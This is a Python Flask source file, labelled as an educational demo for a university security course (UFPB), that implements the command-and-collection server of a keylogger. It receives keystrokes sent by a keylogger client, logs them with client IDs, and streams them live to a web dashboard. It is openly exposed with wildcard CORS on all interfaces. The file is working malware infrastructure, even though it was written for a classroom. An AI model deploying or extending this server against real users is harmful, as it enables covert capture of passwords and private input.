"""
=============================================================
  DEMO EDUCACIONAL - Seguranca Computacional - UFPB
  Servidor de coleta de keystrokes (APENAS PARA APRESENTACAO)
=============================================================
"""

from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO
from datetime import datetime

app = Flask(__name__)
app.config["SECRET_KEY"] = "demo-educacional-ufpb"
socketio = SocketIO(app, cors_allowed_origins="*")

# Armazena os logs em memoria (apenas para a demo)
keystroke_log = []


@app.route("/")
def dashboard():
    """Dashboard web que mostra as teclas capturadas em tempo real."""
    return render_template("dashboard.html")


@app.route("/api/keystroke", methods=["POST"])
def receive_keystroke():
    """Endpoint que recebe teclas do cliente keylogger."""
    data = request.get_json()
    if not data or "key" not in data:
        return jsonify({"error": "campo 'key' obrigatorio"}), 400

    entry = {
        "key": data["key"],
        "timestamp": datetime.now().strftime("%H:%M:%S.%f")[:-3],
        "client_id": data.get("client_id", "desconhecido"),
    }
    keystroke_log.append(entry)

    # Envia em tempo real para o dashboard via WebSocket
    socketio.emit("new_keystroke", entry)

    return jsonify({"status": "ok"}), 200


@app.route("/api/log", methods=["GET"])
def get_log():
    """Retorna todo o log de teclas (para debug)."""
    return jsonify(keystroke_log)


@app.route("/api/clear", methods=["POST"])
def clear_log():
    """Limpa o log."""
    keystroke_log.clear()
    socketio.emit("log_cleared")
    return jsonify({"status": "log limpo"}), 200


if __name__ == "__main__":
    print("=" * 60)
    print("  DEMO EDUCACIONAL - Seguranca Computacional - UFPB")
    print("  Servidor rodando em http://localhost:8080")
    print("  Abra o navegador para ver o dashboard em tempo real")
    print("=" * 60)
    socketio.run(app, host="0.0.0.0", port=8080, debug=True)
